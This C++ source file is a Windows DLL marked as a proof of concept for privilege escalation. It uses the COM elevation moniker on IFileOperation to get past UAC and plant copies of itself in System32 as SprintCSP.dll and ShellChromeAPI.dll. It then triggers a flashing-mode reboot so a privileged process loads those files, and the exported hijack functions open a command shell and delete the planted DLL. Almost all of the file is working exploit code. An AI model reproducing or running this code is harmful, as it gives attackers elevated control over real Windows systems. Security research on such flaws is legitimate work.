// ShellChromeAPI.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"

_NT_BEGIN

volatile const UCHAR guz = 0;

enum SHUTDOWN_REQUEST_TYPE {};

void dprint(PCSTR format, ...)
{
	va_list args;
	va_start(args, format);

	PSTR buf = 0;
	int len = 0;

	while (0 < (len = _vsnprintf(buf, len, format, args)))
	{
		if (buf)
		{
			OutputDebugStringA(buf);
			break;
		}

		buf = (PSTR)alloca(++len);
	}
	va_end(args);
}

template <typename T> 
T HR(HRESULT& hr, T t)
{
	hr = t ? NOERROR : GetLastError();
	return t;
}

void StartCmd(_In_ PCWSTR lpTitle);

static const WCHAR SprintCSP[] = L"SprintCSP.dll";
static const WCHAR ShellChromeAPI[] = L"ShellChromeAPI.dll";

void RemapSelf();

void DoDelete(_In_ PCWSTR lpFile)
{
	WCHAR sz[0x80];
	if (0 < swprintf_s(sz, _countof(sz), L"\\systemroot\\system32\\%ws", lpFile))
	{
		UNICODE_STRING ObjectName;
		OBJECT_ATTRIBUTES oa = { sizeof(oa), 0, &ObjectName, OBJ_CASE_INSENSITIVE };
		RtlInitUnicodeString(&ObjectName, sz);
		RemapSelf();
		NTSTATUS status = ZwDeleteFile(&oa);
		dprint("[%x]:%s(\"%ws\")=%x \n", GetCurrentProcessId(), __FUNCTION__, lpFile, status);
	}
}

void WINAPI Shell_RequestShutdownEx(ULONG , SHUTDOWN_REQUEST_TYPE)
{
	if (IsDebuggerPresent()) __debugbreak();

	dprint("[%x]:%s:\n", GetCurrentProcessId(), __FUNCTION__);

	StartCmd(ShellChromeAPI);
	DoDelete(ShellChromeAPI);
}

void WINAPI FactoryResetUICC()
{
	if (IsDebuggerPresent()) __debugbreak();

	dprint("[%x]:%s:\n", GetCurrentProcessId(), __FUNCTION__);

	StartCmd(SprintCSP);
	DoDelete(SprintCSP);
}

enum { eSprintCSP, eShellChromeAPI };

HRESULT DeleteItem(IFileOperation *pFileOp, PCWSTR pszItem)
{
	IShellItem* pItem;

	HRESULT hr;
	BOOL bFail = TRUE;

	if (S_OK == (hr = SHCreateItemInKnownFolder(FOLDERID_System, 
		KF_FLAG_DONT_VERIFY|KF_FLAG_SIMPLE_IDLIST, pszItem, IID_PPV_ARGS(&pItem))))
	{
		if (0 > (hr = pFileOp->DeleteItem(pItem, 0))
			|| 
			0 > (hr = pFileOp->PerformOperations())
			||
			0 > (hr = pFileOp->GetAnyOperationsAborted(&bFail)))
		{
		}
		else if (bFail)
		{
			hr = E_ABORT;
		}
		pItem->Release();
	}

	return hr;
}

HRESULT CopySelfToSystem32()
{
	HRESULT hr = E_OUTOFMEMORY;

	if (PWSTR lpFilename = new WCHAR[0x8000])
	{
		GetModuleFileNameW((HMODULE)&__ImageBase, lpFilename, 0x8000);

		if (NOERROR == (hr = GetLastError()))
		{
			dprint("[%x]:%s: \"%S\"\n", GetCurrentProcessId(), __FUNCTION__, lpFilename);

			IShellItem* psiDestinationFolder;

			PIDLIST_ABSOLUTE pidl;

			// SHCreateItemInKnownFolder(FOLDERID_Windows, KF_FLAG_DONT_VERIFY|KF_FLAG_SIMPLE_IDLIST, L"system32", IID_PPV_ARGS(&psiDestinationFolder))

			if (S_OK == (hr = SHGetKnownFolderIDList(FOLDERID_System, KF_FLAG_DONT_VERIFY|KF_FLAG_SIMPLE_IDLIST, 0, &pidl)))
			{
				hr = SHCreateItemFromIDList(pidl, IID_PPV_ARGS(&psiDestinationFolder));

				ILFree(pidl);

				if (S_OK == hr)
				{
					IFileOperation *pFileOp;

					BIND_OPTS2 bo = { sizeof(bo) };
					bo.dwClassContext = CLSCTX_LOCAL_SERVER;

					if (!CoGetObject(L"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}", &bo, IID_PPV_ARGS(&pFileOp)))
					{
						dprint("[%x]:%s: Administrator!new\n", GetCurrentProcessId(), __FUNCTION__);

						BOOL bFail = TRUE;
						pFileOp->SetOperationFlags(FOF_NOCONFIRMATION | FOF_NOERRORUI | FOF_NOCONFIRMMKDIR| FOF_FILESONLY| FOFX_EARLYFAILURE);

						hr = DeleteItem(pFileOp, SprintCSP);
						hr = DeleteItem(pFileOp, ShellChromeAPI);

						if (0 > (hr = pFileOp->NewItem(psiDestinationFolder, 0, SprintCSP, lpFilename, 0))
							|| 
							0 > (hr = pFileOp->NewItem(psiDestinationFolder, 0, ShellChromeAPI, lpFilename, 0))
							||
							0 > (hr = pFileOp->PerformOperations())
							||
							0 > (hr = pFileOp->GetAnyOperationsAborted(&bFail)))
						{
						}
						else if (bFail)
						{
							hr = E_ABORT;
						}

						pFileOp->Release();

					}

					psiDestinationFolder->Release();
				}
			}
		}

		delete [] lpFilename;
	}
	
	dprint("[%x]:%s: =%x\n", GetCurrentProcessId(), __FUNCTION__, hr);

	return hr;
}

STDAPI DllRegisterServer()
{
	if (IsDebuggerPresent()) __debugbreak();

	dprint("[%x]:%s: +++ POC\n", GetCurrentProcessId(), __FUNCTION__);

	// regsvr32.exe already called this
	// if (0 <= CoInitializeEx(0, COINIT_APARTMENTTHREADED|COINIT_DISABLE_OLE1DDE))
	{
		if (S_OK == CopySelfToSystem32())
		{
			if (HMODULE hmod = LoadLibraryW(L"ext-ms-win-storage-sense-l1-2-0"))// //STORAGEUSAGE.DLL
			{
				union {
					void* pfn;
					HRESULT(WINAPI* RebootToFlashingMode)(HANDLE hHandle, ULONG dwMilliseconds); // <= 2min
				};

				if (pfn = GetProcAddress(hmod, "RebootToFlashingMode"))
				{
					// only once can be called or E_CHANGED_STATE
					HRESULT hr = RebootToFlashingMode(0, 0);
					dprint("[%x]:%s: RebootToFlashingMode=%x\n", GetCurrentProcessId(), __FUNCTION__, hr);
				}
			}
		}

		//CoUninitialize();
	}

	dprint("[%x]:%s: --- POC\n", GetCurrentProcessId(), __FUNCTION__);

	return S_OK;
}

_NT_END